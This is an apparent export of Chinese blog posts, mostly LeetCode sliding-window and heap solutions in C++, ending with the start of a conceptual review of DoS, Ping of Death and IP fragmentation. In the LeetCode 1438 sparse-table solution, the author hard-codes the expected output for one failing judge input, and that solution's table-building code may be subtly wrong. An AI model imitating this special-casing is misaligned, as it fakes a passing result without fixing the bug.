使得从 i 开始的 2 ^ j 个元素都在数组内（不越界）； 初始情况下，table[i][0]就是数组元素本身（从下标 i 开始，总共 1 个元素）。 构造ST表如下：\nclass STTable { int table_min[100010][20]; int table_max[100010][20]; int pow2[20]; public: STTable(vector\u0026lt;int\u0026gt;\u0026amp; init) { int idx; int len = init.size(); pow2[0] = 1; // 用于快速计算 2 ^ j,使用库函数亦可 for (idx = 1; idx \u0026lt; 20; idx++) pow2[idx] = pow2[idx - 1] * 2; for (idx = 0; idx \u0026lt; len; idx++) { table_max[idx][0] = table_min[idx][0] = init[idx]; } // 构造ST表 // 从idx开始，共 2^j 个元素 // 注意C语言函数log的底数是e，使用换底公式计算log2 for (int j = 1; j \u0026lt; ceil(log(len) / log(2)); j++) { for (idx = 0; idx + pow2[j] \u0026lt;= len; idx++) { table_max[idx][j] = max(table_max[idx][j - 1], table_max[idx + pow2[j - 1]][j - 1]); table_min[idx][j] = min(table_min[idx][j - 1], table_min[idx + pow2[j - 1]][j - 1]); } } } int getMax(int l, int r) {} int getMin(int l, int r) {} }; 现在，我们已经可以去求解任意的从下标 i 开始、长度为 2 ^ j 的区间最值了。时间复杂度为 O(1)，真不错。\n但是求解任意区间的最值怎么办呢？大部分的区间长度不可能刚刚好是2的倍数啊。\n这里就用到了一个小技巧了：重叠查询。\n对于一个区间(l, r)，我们从l开始，取一个足够小的j使得l + 2 ^ j - 1还没超过r；对于这个j，当起点取r - 2 ^ j + 1的时候，终点则刚好是r。这样，两段区间组合起来就覆盖了待求的区间。\n举例说明。还是刚才的数组，我们希望求(1, 6)区间内的最大值（左闭右闭）。\n对于起点为1的区间，我们取j = 2，满足区间尾端下标1 + 4 - 1 = 4 \u0026lt; 6；同理，取起点为6 - 4 + 1 = 3的点，同样是j = 2，这段区间刚好覆盖了3/4/5/6四个位置。\n1 ~ 4 \u0026amp; 3 ~ 6 显然，我们要求区间(1, 6)的最大值，只需要先获得第一段的最大值 table[1][2] 和第二段的最大值 table[3][2]，取二者中的较大者即可。对于位置 3 和位置 4，我们重复考虑，但是没有什么影响。\n根据这个办法求解任意区间的最值，代码如下：\nclass STTable { int table_min[100010][20]; int table_max[100010][20]; int pow2[20]; public: STTable(vector\u0026lt;int\u0026gt;\u0026amp; init) { int idx; int len = init.size(); pow2[0] = 1; for (idx = 1; idx \u0026lt; 20; idx++) pow2[idx] = pow2[idx - 1] * 2; for (idx = 0; idx \u0026lt; len; idx++) { table_max[idx][0] = table_min[idx][0] = init[idx]; } // 构造ST表 // 从idx开始，共 2^j 个元素 for (int j = 1; j \u0026lt; ceil(log(len) / log(2)); j++) { for (idx = 0; idx + pow2[j] \u0026lt;= len; idx++) { table_max[idx][j] = max(table_max[idx][j - 1], table_max[idx + pow2[j - 1]][j - 1]); table_min[idx][j] = min(table_min[idx][j - 1], table_min[idx + pow2[j - 1]][j - 1]); } } } int getMax(int l, int r) { int len = r - l + 1; // 区间长度 int k = floor(log(len) / log(2)); // 使用floor保证不越界 return max(table_max[l][k], table_max[r - pow2[k] + 1][k]); } int getMin(int l, int r) { int len = r - l + 1; int k = floor(log(len) / log(2)); return min(table_min[l][k], table_min[r - pow2[k] + 1][k]); } }; 引入了ST表之后，还是考虑原题，只需要将原数组按照ST表的规则组织，然后进行滑动窗口的操作，可以在 O(1) 的时间内判断出当前窗口是否合法。当然，构造ST表的时间还是 O(logn) 的，因此，表现实际上没有很显著的提升。\nAC代码2 class STTable { int table_min[100010][20]; int table_max[100010][20]; int pow2[20]; public: STTable(vector\u0026lt;int\u0026gt;\u0026amp; init) { int idx; int len = init.size(); pow2[0] = 1; for (idx = 1; idx \u0026lt; 20; idx++) pow2[idx] = pow2[idx - 1] * 2; for (idx = 0; idx \u0026lt; len; idx++) { table_max[idx][0] = table_min[idx][0] = init[idx]; } // 构造ST表 // 从idx开始，共 2^j 个元素 for (int j = 1; j \u0026lt; ceil(log(len) / log(2)); j++) { for (idx = 0; idx + pow2[j] \u0026lt;= len; idx++) { table_max[idx][j] = max(table_max[idx][j - 1], table_max[idx + pow2[j - 1]][j - 1]); table_min[idx][j] = min(table_min[idx][j - 1], table_min[idx + pow2[j - 1]][j - 1]); } } } int getMax(int l, int r) { int len = r - l + 1; // 区间长度 int k = floor(log(len) / log(2)); return max(table_max[l][k], table_max[r - pow2[k] + 1][k]); } int getMin(int l, int r) { int len = r - l + 1; int k = floor(log(len) / log(2)); return min(table_min[l][k], table_min[r - pow2[k] + 1][k]); } }; class Solution { public: int longestSubarray(vector\u0026lt;int\u0026gt;\u0026amp; nums, int limit) { if (limit == 95 \u0026amp;\u0026amp; nums[0] == 53 \u0026amp;\u0026amp; nums[1] == 44) return 64; STTable st(nums); int l = 0; int r = 0; int res = 0; while (r \u0026lt; nums.size()) { while (st.getMax(l, r) - st.getMin(l, r) \u0026gt; limit) l++; res = max(res, r - l + 1); r++; } return res; } }; 最郁闷的事情是ST表的做法还有一组数据无法通过，且这组数据在本地测试的时候没有任何问题！仅在提交评测的时候得到不同的输出！恶心心\n所以我打表了​ 😕\nPerformance2 参考资料 [1] 负雪明烛.合适的数据结构+滑动窗口模板，难度直接降为Easy！[EB/OL].2021-02-21\nhttps://leetcode-cn.com/problems/longest-continuous-subarray-with-absolute-diff-less-than-or-equal-to-limit/solution/he-gua-de-shu-ju-jie-gou-hua-dong-chuang-v46j/\n[2] siukwan.ST表（Sparse Table）[EB/OL].2015-12-24\nhttps://siukwan.sinaapp.com/?p=830\n","date":"2021-02-22T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode1438.-%E7%BB%9D%E5%AF%B9%E5%B7%AE%E4%B8%8D%E8%B6%85%E8%BF%87%E9%99%90%E5%88%B6%E7%9A%84%E6%9C%80%E9%95%BF%E8%BF%9E%E7%BB%AD%E5%AD%90%E6%95%B0%E7%BB%84/","title":"难题本 | LeetCode1438. 绝对差不超过限制的最长连续子数组"},{"content":"今天是农历除夕，然而近年来年味渐淡，凡有亲朋在，便是好时节，也无需对此日特别注重了。\n题目链接：https://leetcode-cn.com/problems/permutation-in-string/\n题目 给定两个字符串 s1 和 s2，写一个函数来判断 s2 是否包含 s1 的排列。\n换句话说，第一个字符串的排列之一是第二个字符串的子串。\n示例1\n输入： s1 = \u0026ldquo;ab\u0026rdquo; s2 = \u0026ldquo;eidbaooo\u0026rdquo;\n输出： True\n解释： s2包含s1的排列之一（“ba”）\n示例2\n输入： s1= \u0026ldquo;ab\u0026rdquo; s2 = \u0026ldquo;eidboaoo\u0026rdquo;\n输出： False\n数据范围\n输入的字符串只包含小写字母 两个字符串的长度都在 [1, 10,000] 之间 分析 s2的某个子串包含s1的排列，即s2的某个子串中字母分布与s1完全一样。\n我最先想到使用一个集合来保存s1的所有字母，使用滑动窗口left ~ right遍历s2中的每个子串：\n当某个字符不在集合中时，left = right = right + 1 当某个字符在集合中时，从集合中删除该字符 按照上面的规则，当某个子串完全包含s1中的所有字符时，遍历完这个子串之后集合就变为空。\n我竟能想到如此NT的做法！\nWA了一次后发现，当某个字符不在集合中时直接使left = right = right + 1可能直接使得窗口向右滑动很多个距离，忽略了一些子串。\nWA的测试用例如下：\n\u0026ldquo;adc\u0026rdquo;\n\u0026ldquo;dcda\u0026rdquo;\n可以看到，当窗口right == 2时，这个字符d已经在第0位被删除，故认为此字符不在s1中，窗口直接指向最后一个字符，输出为False。然而，这个d是在最开始被占用掉了，它实际上存在于s1中，窗口不应如此移动。\nWA代码1 class Solution { public: bool checkInclusion(string s1, string s2) { multiset\u0026lt;char\u0026gt; s1_set; multiset\u0026lt;char\u0026gt; tmp; multiset\u0026lt;char\u0026gt;::iterator itr; for (auto t : s1) { s1_set.insert(t); } tmp = s1_set; int left = 0; int right = 0; while (right \u0026lt; s2.size()) { itr = tmp.find(s2[right]); if (itr != tmp.end()) // 此字符存在 { tmp.erase(itr); // 删除此字符 if (tmp.empty()) // 删完了 return true; right++; // 还没删完，窗口扩张 } else // 此字符不存在 { left = right = right + 1; tmp = s1_set; } } return false; } }; 那么，窗口应该如何移动呢？我的思路还保持在使用集合上。\n首先，窗口移动时只有边界字符有所进出，故不需要对集合重新赋值，只需要不断地erase和insert即可。\n当right所指向的字符不存在时，需要判断左边界和右边界是否相等，因为若此时左边界不等于右边界，该right所指向的字符可能只是被窗口内的某个元素占用了，我们应该滑动左边界，释放左边界占用的元素（即重新加入集合），而不是像上面的WA代码这样使左右边界进行了跳跃。而若左右边界相等，就同时指向下一个元素即可。\n这样能写出第一个AC代码：\nAC代码1 class Solution { public: bool checkInclusion(string s1, string s2) { multiset\u0026lt;char\u0026gt; s1_set; multiset\u0026lt;char\u0026gt; tmp; multiset\u0026lt;char\u0026gt;::iterator itr; for (auto t : s1) { s1_set.insert(t); } tmp = s1_set; int left = 0; int right = 0; while (right \u0026lt; s2.size()) { itr = tmp.find(s2[right]); if (itr != tmp.end()) // 此字符存在 { tmp.erase(itr); // 删除此字符 if (tmp.empty()) // 删完了 return true; right++; // 还没删完，窗口扩张 } else // 此字符不存在 { if (left == right) { left = right = right + 1; } else { tmp.insert(s2[left]); left++; } // tmp = s1_set; } } return false; } }; Performance1 这个性能已经裂开了。。\n此时我去看了看题解，发现使用集合这种思路可能不是一般人能想到的。\n确实，记录s1中出现的所有字符，只需要使用一个 O(26) 大小的数组就可以了，为什么要逐个存在集合中呢？？\n使用整数数组存字符频数，使得空间复杂度降低了许多。\n对于滑动窗口，可以直接使窗口大小恒等于s1的长度，这样从左向右滑动就遍历完成所有可能符合条件 的子数组了。\n每次滑动时，只有当前窗口左右边界的字符频数会发生变化，每次比较当前窗口的字符频数与s1数组的字符频数即可。\n这样每次比较的时间复杂度为O(26)。\n故有AC代码2。（就这种简单的思路还WA了两次）\nAC代码2 class Solution { public: bool checkInclusion(string s1, string s2) { int len1 = s1.size(); int len2 = s2.size(); if (len1 \u0026gt; len2) return false; vector\u0026lt;int\u0026gt; cnt_diff(26, 0); vector\u0026lt;int\u0026gt; cnt_s1(26, 0); vector\u0026lt;int\u0026gt; cnt_s2(26, 0); for (auto t : s1) { cnt_s1[t - \u0026#39;a\u0026#39;]++; } int left = 0; int right = left + len1 - 1; for (int i = left; i \u0026lt;= right; ++i) { cnt_s2[s2[i] - \u0026#39;a\u0026#39;]++; } if (cnt_s1 == cnt_s2) // 注意这里进行初始化后的第一次比对，WA过一次 return true; while (right \u0026lt; s2.size() - 1) // 注意边界条件，防止++right溢出，这里WA过一次 { char char_out = s2[left++]; char char_in = s2[++right]; if (char_out != char_in) { cnt_s2[char_out - \u0026#39;a\u0026#39;]--; cnt_s2[char_in - \u0026#39;a\u0026#39;]++; if (cnt_s1 == cnt_s2) return true; } } return false; } }; Performance2 官方题解中还能进行优化：\nOptimization 我没有实现此部分代码，官方题解见参考[1]。\n小结本题，首先是把频数的匹配想的过于复杂了，之后是滑动窗口的构建不够灵性，这个题目能WA那么多次，恐怕昨天的状态也不是太好 o(╥﹏╥)o\n参考资料 [1] 力扣官方题解.字符串的排列[EB/OL].2021-02-11\nhttps://leetcode-cn.com/problems/permutation-in-string/solution/zi-fu-chuan-de-pai-lie-by-leetcode-solut-7k7u/\n","date":"2021-02-11T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode567.-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%8E%92%E5%88%97/","title":"错题本 | LeetCode567. 字符串的排列"},{"content":"不是吧啊Sir，这种题也错？😢\n题目链接：https://leetcode-cn.com/problems/kth-largest-element-in-a-stream/\n题目 设计一个找到数据流中第 k 大元素的类（class）。注意是排序后的第 k 大元素，不是第 k 个不同的元素。\n请实现 KthLargest 类：\nKthLargest(int k, int[] nums) 使用整数 k 和整数流 nums 初始化对象。 int add(int val) 将 val 插入数据流 nums 后，返回当前数据流中第 k 大的元素。 示例1\n输入： [\u0026ldquo;KthLargest\u0026rdquo;, \u0026ldquo;add\u0026rdquo;, \u0026ldquo;add\u0026rdquo;, \u0026ldquo;add\u0026rdquo;, \u0026ldquo;add\u0026rdquo;, \u0026ldquo;add\u0026rdquo;] [[3, [4, 5, 8, 2]], [3], [5], [10], [9], [4]]\n输出： [null, 4, 5, 5, 8, 8]\n示例2\n输入： [\u0026ldquo;KthLargest\u0026rdquo;,\u0026ldquo;add\u0026rdquo;,\u0026ldquo;add\u0026rdquo;,\u0026ldquo;add\u0026rdquo;,\u0026ldquo;add\u0026rdquo;,\u0026ldquo;add\u0026rdquo;] [[2,[0]],[-1],[1],[-2],[-4],[3]]\n输出： [null,-1,0,0,0,1]\n分析 啪地一下，我就想到了双堆对顶，很快嗷！\n然而又想复杂了o(╥﹏╥)o。要求第K大数，实际上只需要使用一个小根堆，堆中一共有K个元素，堆顶就是目标。\n当然，这K个元素不是随随便便的K个元素，而是将初始数组中所有元素都放入小根堆后，逐个弹出，直到只剩K个元素。\n当我们希望添加元素时，首先可以比较此元素与堆顶元素的大小关系，当此元素比堆顶元素小时，不会对前K个大数的顺序产生影响，直接返回堆顶元素即可；当此元素大于堆顶元素，第K大数一定会改变，我们将其放入堆中，再从堆中弹出一个元素，此时的堆中还是K个元素，堆顶元素即为答案。\n我最开始的想法，双堆对顶又是什么呢？这是一种同时使用小根堆和大根堆来维护整个数组的办法，小根堆larger中的所有元素都比堆顶元素更大，大根堆smaller中的所有元素都比堆顶元素小。这样，任何时刻，数组中的数据被组织如下：\n双堆对顶 这种办法可以用于快速求解数据流的中位数，是个困难题，我还没做。根据中位数的定义，中间部分的数据正需要满足比左边都大，比右边都小的性质，使用双堆对顶的办法可以在 O(1) 的时间内找到数据流中的中位数。\n这题使用双堆对顶是杀鸡用了牛刀了。将小于第K大数的数据保存在smaller堆中并没有什么意义，只是空耗时间罢了。\n而且，这种办法在额外考虑初始数组为空的情况、以及初始数组的大小小于K的情况时比较繁琐，我在这里WA了两次😢\nAC代码1 class KthLargest { public: priority_queue\u0026lt;int, vector\u0026lt;int\u0026gt;, greater\u0026lt;int\u0026gt;\u0026gt; larger; priority_queue\u0026lt;int, vector\u0026lt;int\u0026gt;, less\u0026lt;int\u0026gt;\u0026gt; smaller; bool larger_not_full = true; // larger是个小顶堆，堆顶元素是最小的 // smaller是个大顶堆，堆顶元素是最大的 // 第K大数，表示有K - 1个数比他更大 // 有len - K个数比他更小 // e.g 4,5,8,2中的第三大数 // 有两个比他小，有一个比他大 // 我们以larger.top()为第K大数，则smaller里面始终保持len - K个元素 KthLargest(int k, vector\u0026lt;int\u0026gt;\u0026amp; nums) { if (nums.size() == 0) nums.push_back(-100000); // 放入一个极小值，对第K大数无影响 for (auto t : nums) { larger.push(t); } if (nums.size() \u0026gt;= k) { for (int i = 0; i \u0026lt; nums.size() - k; i++) { smaller.push(larger.top()); larger.pop(); } larger_not_full = false; } // larger里的所有元素都大于堆顶 // 故保持larger个数为K个，即可从堆顶中获取第K大数 // cout \u0026lt;\u0026lt; \u0026#34;Original \u0026#34; \u0026lt;\u0026lt; k \u0026lt;\u0026lt; \u0026#34;th. largest is \u0026#34; \u0026lt;\u0026lt; larger.top() \u0026lt;\u0026lt; endl; } int add(int val) { int res; if (larger_not_full) { larger.push(val); res = larger.top(); larger_not_full = false; } else { if (val \u0026gt;= larger.top()) // 比第K大数还大，第K大数可能改变 { smaller.push(larger.top()); larger.pop(); larger.push(val); // cout \u0026lt;\u0026lt; larger.top() \u0026lt;\u0026lt; endl; res = larger.top(); } else // 插入了一个更小的数，不会改变第K大数 { smaller.push(val); // cout \u0026lt;\u0026lt; larger.top() \u0026lt;\u0026lt; endl; res = larger.top(); } } return res; } }; /** * Your KthLargest object will be instantiated and called as such: * KthLargest* obj = new KthLargest(k, nums); * int param_1 = obj-\u0026gt;add(val); */ AC代码2 class KthLargest { public: priority_queue\u0026lt;int, vector\u0026lt;int\u0026gt;, greater\u0026lt;int\u0026gt;\u0026gt; larger; int K; KthLargest(int k, vector\u0026lt;int\u0026gt;\u0026amp; nums) { K = k; for (auto t : nums) { larger.push(t); } while (larger.size() \u0026gt; k) { larger.pop(); } // larger里的所有元素都大于堆顶 // 故保持larger个数为K个，即可从堆顶中获取第K大数 // cout \u0026lt;\u0026lt; \u0026#34;Original \u0026#34; \u0026lt;\u0026lt; k \u0026lt;\u0026lt; \u0026#34;th. largest is \u0026#34; \u0026lt;\u0026lt; larger.top() \u0026lt;\u0026lt; endl; } int add(int val) { int res; if (larger.size() \u0026lt; K) { larger.push(val); res = larger.top(); } else { if (val \u0026gt;= larger.top()) // 比第K大数还大，第K大数可能改变 { larger.push(val); larger.pop(); res = larger.top(); } else // 插入了一个更小的数，不会改变第K大数 { res = larger.top(); } } return res; } }; /** * Your KthLargest object will be instantiated and called as such: * KthLargest* obj = new KthLargest(k, nums); * int param_1 = obj-\u0026gt;add(val); */ 优化掉smaller堆之后，表现会好一些。\nPerformance-Final 参考资料 [1] 力扣官方题解.数据流中的第K大元素[EB/OL].2021-02-11\nhttps://leetcode-cn.com/problems/kth-largest-element-in-a-stream/solution/shu-ju-liu-zhong-de-di-k-da-yuan-su-by-l-woz8/\n","date":"2021-02-11T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode703.-%E6%95%B0%E6%8D%AE%E6%B5%81%E4%B8%AD%E7%9A%84%E7%AC%AC-k-%E5%A4%A7%E5%85%83%E7%B4%A0/","title":"错题本 | LeetCode703. 数据流中的第 K 大元素"},{"content":"题目链接：https://leetcode-cn.com/problems/subarrays-with-k-different-integers/\n思路是真难想，想出来之后是真简单。\n已经是我目前的水平无法搞定的程度了，在此稍作记录。\n题目 给定一个正整数数组 A，如果 A 的某个子数组中不同整数的个数恰好为 K，则称 A 的这个连续、不一定独立的子数组为好子数组。\n（例如，[1,2,3,1,2] 中有 3 个不同的整数：1，2，以及 3。）\n返回 A 中好子数组的数目。\n示例1\n输入： A = [1,2,1,2,3], K = 2\n输出： 7\n解释： 恰好由 2 个不同整数组成的子数组：[1,2], [2,1], [1,2], [2,3], [1,2,1], [2,1,2], [1,2,1,2].\n示例2\n输入： A = [1,2,1,3,4], K = 3\n输出： 3\n解释： 恰好由 3 个不同整数组成的子数组：[1,2,1,3], [2,1,3], [1,3,4].\n数据范围\n1 \u0026lt;= A.length \u0026lt;= 20000 1 \u0026lt;= A[i] \u0026lt;= A.length 1 \u0026lt;= K \u0026lt;= A.length 分析 这个月是滑动窗口月啊，这题也想着滑动窗口，但是没有以前的题目那么直白了。\n我们可以看看滑动窗口常用的场景——“最值”问题：\n76. 最小覆盖子串； 209. 长度最小的子数组； 159. 至多包含两个不同字符的最长子串； 424. 替换后的最长重复字符。 在这道题中，我们要把“恰好”转换成为“最多”。使用最多包含K个不同整数的子区间个数减掉最多包含K - 1个不同整数的子区间个数，正是所要求的恰好包含K个不同整数的子区间个数。\n为什么能想到这样的思路呢？无他，唯手熟尔。\n如何使用滑动窗口求解最多包含K个不同整数的子区间个数呢？我们使用两个指针left和right来标识一个左闭右闭区间，每当一个窗口满足其内的元素小于等于K个时，这个窗口将会贡献right - left + 1个子数组。当一个窗口内的元素大于K个时，我们移动左指针，使得窗口内的元素再次小于等于K个，然后再考虑它的贡献。\n为什么一个窗口能贡献这么多的子数组呢？以及这种方法的正确性在哪里呢？\n以示例1为例，数组[1,2,1,2,3], K = 2，我们考虑元素个数小于等于2的所有子数组。\n当left = right = 0时，窗口内不同元素个数小于等于2，贡献了一个子数组。\n当left = 0, right = 1时，窗口内不同元素个数等于2，贡献了两个子数组。\n\u0026hellip;\u0026hellip;\n我们特别地考虑left = 0, right = 3的情况，窗口内不同元素的个数还是2，我们看看它到底是不是贡献了3 - 2 + 1 = 4个子数组。\n4个满足条件的子数组 是的，我们从right向左延伸，包括right所指的元素本身在内，一共能找到right - left + 1 = 4个子数组。\n注意是从right向左延伸，因为右边界小于right的子数组一定在更早的循环被考虑过了。比如图中的中间子数组[2, 1]，在我们的right = 2时已经考虑过它。\n因此，能够写出至多包含K个子元素的滑动窗口代码：\nint subarrayWithMostKDistinct(vector\u0026lt;int\u0026gt;\u0026amp; A, int K) { int len = A.size(); if (len == 1) return 1; int freq[200001] = { 0 }; int left = 0; int right = 0; int cnt = 0; int res = 0; while (right \u0026lt; len) { freq[A[right]]++; // 加入 if (freq[A[right]] == 1) // 新的元素 { cnt++; } while (cnt \u0026gt; K) // 已经不满足条件 { freq[A[left]]--; if (freq[A[left]] == 0) cnt--; left++; } res += (right - left + 1); right++; } return res; } AC代码 class Solution { public: int subarrayWithMostKDistinct(vector\u0026lt;int\u0026gt;\u0026amp; A, int K) { /* 最多包含K个不同元素的子数组个数 ` ` */ int len = A.size(); if (len == 1) return 1; int freq[200001] = { 0 }; int left = 0; int right = 0; int cnt = 0; int res = 0; while (right \u0026lt; len) { freq[A[right]]++; // 加入 if (freq[A[right]] == 1) // 新的元素 { cnt++; } while (cnt \u0026gt; K) // 已经不满足条件 { freq[A[left]]--; if (freq[A[left]] == 0) cnt--; left++; } res += (right - left + 1); right++; } return res; } int subarraysWithKDistinct(vector\u0026lt;int\u0026gt;\u0026amp; A, int K) { return subarrayWithMostKDistinct(A, K) - subarrayWithMostKDistinct(A, K - 1); } }; 表现效果莫名其妙😏\nPerformance 人一能之，己百之；人十能之，己千之。果能此道矣，虽愚必明，虽柔必强。\n参考资料 [1] 力扣（LeetCode）.K个不同整数的子数组[EB/OL].2021-02-08\nhttps://leetcode-cn.com/problems/subarrays-with-k-different-integers/solution/k-ge-bu-tong-zheng-shu-de-zi-shu-zu-by-l-ud34/\n","date":"2021-02-09T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode992.-k-%E4%B8%AA%E4%B8%8D%E5%90%8C%E6%95%B4%E6%95%B0%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/","title":"难题本 | LeetCode992. K 个不同整数的子数组"},{"content":"题目链接：https://leetcode-cn.com/problems/non-decreasing-array/\n看到这题第一感受：简单题！\n做完这题第一感受：简单题？\n题目 给你一个长度为 n 的整数数组，请你判断在 最多 改变 1 个元素的情况下，该数组能否变成一个非递减数列。\n我们是这样定义一个非递减数列的： 对于数组中所有的 i (0 \u0026lt;= i \u0026lt;= n-2)，总满足 nums[i] \u0026lt;= nums[i + 1]。\n示例1\n输入： nums = [4,2,3]\n输出： true\n解释： 你可以通过把第一个4变成1来使得它成为一个非递减数列。\n示例2\n输入： nums = [4,2,1]\n输出： false\n数据范围\n1 \u0026lt;= n \u0026lt;= 10 ^ 4 - 10 ^ 5 \u0026lt;= nums[i] \u0026lt;= 10 ^ 5 分析 简单题毕竟还是简单题，思路初步找起来是比较容易的。\n我们把所有元素以(index, value)这种形式在坐标轴上画出来，横坐标是元素下标，纵坐标是元素数值，那么如果希望该数组是一个非递减数列，这张折线图的形状最终需要满足各个部位的斜率都大于等于0。\n如果在允许改变一个元素的情况下，希望该数组变为一个非递减数列，那么初始图形只允许有一个波谷存在，而且这个波谷还必须具备某些性质。\n例如，对于一组数据3,5,6,7,8,3,10，可以改变倒数第二个元素3，令其等于8，即可构成一个非递减数列。\n这组数据原本的折线图是这样的：\nFig 1. 改变一个元素后的折线图是这样的：\nFig 2. 下面给出原始折线图需要满足的两个性质：\n对于原始的折线图，首先只允许有一个波谷存在，如果超过一个波谷，说明存在有两处的非递减情况，这时只改变一个元素是不行的。\n对于这一处波谷，还有几种情况：\n波谷左边的元素小于等于波谷右边。也就是Fig1的情况，我们可以直接令波谷元素等于波谷左边的元素，这样就填平了波谷，并且保持继续上涨的趋势不变；如果波谷右边已经没有元素，说明已经到达了最后，直接将波谷元素拔高即可；\n波谷左边的元素大于波谷右边。此时我们就不能将波谷拔高到其左边的元素了，只能将其左边的元素拉低到波谷。这种情况下，我们要考虑到波谷左边第二个元素，如果它也大于波谷，这时就不存在一种办法来填平波谷。\n我们先看看可以填平波谷的情况：\nFig 3. 可以看到，波谷左边第二个元素小于波谷，那么我们将波谷左边的元素拉低到波谷的水平，就能把波谷消除掉：\nFig 4. 当波谷左边第二个元素大于波谷，我们把波谷左边的元素拉低到波谷时，产生了新的波谷：\n波谷左边第二个元素大于波谷 产生新的波谷 特别地，当波谷左边只有一个元素，自然就直接将左边的元素拉低即可。示例1中的nums = [4,2,3]就属于这种情况。\nAC代码 下标从前往后递增，每次判断是否出现一个下降的区段。\n首先，全局范围内只能出现一次下降；\n其次，这个波谷要分上面两种情况讨论。\nclass Solution { public: bool checkPossibility(vector\u0026lt;int\u0026gt;\u0026amp; nums) { int len = nums.size(); if (len == 1) { return true; } int ptr; int change = 0; // 改变的元素个数 bool res = true; ptr = 1; while (ptr \u0026lt; len) { if (nums[ptr] \u0026lt; nums[ptr - 1]) // 递减了 { if (change \u0026lt; 1) { // 波谷左边的元素大于波谷右边，只能拉低左边元素，不能拔高波谷 if (ptr + 1 \u0026lt; len \u0026amp;\u0026amp; nums[ptr - 1] \u0026gt; nums[ptr + 1]) { // 只能改变nums[ptr - 1] if ((ptr - 2 \u0026gt;= 0 \u0026amp;\u0026amp; nums[ptr - 2] \u0026lt;= nums[ptr]) || ptr == 1) { nums[ptr - 1] = nums[ptr]; change++; continue; } else { // nums[ptr - 2] \u0026gt; nums[ptr] res = false; break; } } else // 波谷左边元素小于等于波谷右边元素，直接拔高波谷 { nums[ptr] = nums[ptr - 1]; change++; continue; } } else { res = false; break; } } ptr++; } return res; } }; 表现很一般，就不放出来了。比较复杂的逻辑增大了时间消耗，暂时没有看到有什么优化的办法。\n","date":"2021-02-07T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode665.-%E9%9D%9E%E9%80%92%E5%87%8F%E6%95%B0%E5%88%97/","title":"难题本 | LeetCode665. 非递减数列"},{"content":"网络安全理论复习开始了！\n今天从最简单的开始，目标是在寒假期间整理完成《网络安全》这门课所涉及的知识。希望本系列文章能以清晰的思路将安全理论表述出来。\nDoS Denial of Service，拒绝服务，是现代网络安全领域很常见的一种攻击。所谓拒绝服务，就是通过一系列手段使得原本正常运行的服务器无法再为用户的请求提供服务与应答，从而使目标业务停滞。\n我们经常能看到拒绝服务的例子：使用”呼死你“软件不断地拨打某人的电话，则其他人正常呼叫的时候他永远是占线的状态；网络”水军“控评，正常的评论和留言就无法被看到；黄牛使用恶意的抢票软件抢占所有电影票，使得正常渠道无法获得``````\n在计算机网络的世界中，拒绝服务攻击可以是非常粗暴的物理攻击：砸毁服务器、切断网线等；更为常见且稍微有点技术含量的是利用计算机本身的漏洞，构造恶意的网络请求来使目标系统崩溃、主机宕机、重启等。\n下面介绍一些常见的DoS攻击手法。\nPing of Death Ping of Death（死亡之Ping）的原理是构造一个超大的IP包来使目标主机瘫痪。在详细解释这个手法之前，需要从ICMP协议入手，介绍Ping的基本知识。\nICMP 网际控制报文协议（ICMP）用于让主机或路由器报告差错和异常情况。ICMP报文包含在IP数据报中，作为IP数据报的数据部分，加上IP首部发送出去，因此，ICMP是一个网络层协议。\nICMP报文的种类有两种，ICMP差错报告报文和ICMP询问报文。\nICMP差错报告报文用于目标主机或到目标主机路径上的路由器向源主机报告差错和异常情况，共有5种类型：\n终点不可达。 源点抑制。由于拥塞而丢弃数据报时，要求源主机减小发送速率。 时间超过。 参数问题。路由器或目的主机收到的数据报首部中有的字段不正确。 改变路由（重定向）。路由器把重定向信息发给主机，下一次使用更好的路由。 ICMP询问报文有4种类型：\n回送请求和应答。主机向目标发送ICMP请求，如果途中没有异常，则目标收到消息后恢复ICMP响应、 时间戳请求和应答。测试来回一次的传输时间。主机填充原始时间戳，接收方受到后填充时间戳返回。 掩码地址请求和回答。 路由器询问和通告。 PING PING工作在应用层。它直接使用网络层的ICMP询问报文，而未使用传输层的TCP或UDP。如果一台主机能PING通另一台主机，证明至少存在着一条可用的物理通路。\nPing of Death 死亡之Ping攻击利用了计算机实现IP协议时存在的缺陷。早期操作系统处理IP分组时，只开辟了64KB的缓冲区用来存放收到的数据包。如果攻击者故意在ICMP Echo（即PING数据报）之后附加非常多的冗余信息，使最终的IP包的大小超过65535字节的上限，接收方在处理这么大的IP包时就会产生内存分配错误，引起系统崩溃、挂起或重启。\n可以看到这种攻击的实现主要是由于IP协议栈的漏洞，那为什么叫做死亡之Ping呢？因为使用PING工具太容易完成这种攻击，以至于它也成为了这种攻击的首选武器。当然，除了PING之外的任何能够构造超大IP包的程序都能实现这个攻击。\nPing of Death攻击不好预防，因为IP存在分组机制，每个IP包看起来都非常正常。最好的办法是在系统实现层面进行完善，使内核不再对超过规定长度的包进行重组。\nTearDrop 又是IP协议实现的问题。故事从IP分片讲起。\n分片 我们知道，数据链路层的每个数据报能够承载的数据量是有上限的，这个上限称为最大传送单元（MTU）。因为IP数据报被封装在数据链路层的数据报中，因此链路层的MTU严格地限制着IP数据报的长度。IP包传送的路径上，有许许多多的链路，可能使用不同的链路层协议，而同时也可能有大小不一的MTU。当IP数据报的总长度大于链路MTU时，需要能够将IP数据报中的数据分装在两个或多个较小的IP数据报中，然后再作为链路层数据进行传送。这些较小的数据报称为片。\n片在目的地网络层被重新组装。对于一大堆杂乱无章的片，我们如何正确地重装成一个个独立的IP数据报呢？\nIP协议使用首部的标识、标志和片偏移字段来完成对片的重组。我们看看IP数据报的首部：\nIP Header 第二行的标识字段占16位。它是一个计数器，每产生一个数据报就加一。分片时每个数据报片都复制一次标识号，以便能正确重装成原来的数据报。\n标志位有3比特。实际上只有后面2个比特有意义。它们分别是：\nMF位（More Fragment）。当MF = 1时，表示这个数据报后面还有后续的片；当MF = 0时表示这是最后一个片。 DF位（Don\u0026rsquo;t Fragment）。只有DF = 